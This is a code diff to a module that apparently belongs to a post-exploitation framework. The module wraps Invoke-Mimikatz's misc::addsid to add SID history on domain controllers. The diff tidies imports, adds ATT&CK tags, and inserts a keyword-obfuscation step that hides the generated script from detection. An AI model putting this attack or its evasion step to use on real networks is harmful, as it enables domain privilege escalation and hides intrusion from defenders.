@@ -1,7 +1,10 @@
 from __future__ import print_function
-from builtins import str
+
 from builtins import object
+from builtins import str
+
 from lib.common import helpers
+
 
 class Module(object):
 
@@ -15,6 +18,10 @@ class Module(object):
             'Description': ("Runs PowerSploit's Invoke-Mimikatz function "
                             "to execute misc::addsid to add sid history for a user. "
                             "ONLY APPLICABLE ON DOMAIN CONTROLLERS!"),
+
+            'Software': 'S0194',
+
+            'Techniques': ['T1178'],
 
             'Background' : True,
 
@@ -92,7 +99,10 @@ class Module(object):
 
         # base64 encode the command to pass to Invoke-Mimikatz
         scriptEnd = "Invoke-Mimikatz -Command '\"" + command + "\"';"
+
         if obfuscate:
             scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
         script += scriptEnd
+        script = helpers.keyword_obfuscation(script)
+
         return script
